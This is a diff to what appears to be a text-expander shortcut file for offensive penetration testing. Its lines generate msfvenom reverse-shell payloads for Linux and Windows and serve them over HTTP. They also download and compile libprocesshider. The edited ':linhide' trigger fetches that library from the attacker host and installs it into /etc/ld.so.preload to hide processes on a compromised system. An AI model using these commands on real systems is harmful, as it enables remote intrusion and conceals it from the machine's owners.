@@ -34,7 +34,7 @@ matches:
       msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
       msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
-      wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c && sed -i 's/evil-script.pyt/bash/g' processhider.c && gcc -Wall -fPIC -shared -o ld.so.preload processhider.c -ldl &
+      wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c && sed -i 's/evil-script.pyt/bash/g' processhider.c && gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl &
       sudo python3 -m http.server 80
 
   - trigger: ":rev"
@@ -69,5 +69,5 @@ matches:
     
   - trigger: ":linhide"
     replace: |
-      wget http://{{IP}}/ld.so.preload -O /etc/ld.so.preload
+      wget http://{{IP}}/libprocesshider.so -O /etc/ld.so.preload && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
     
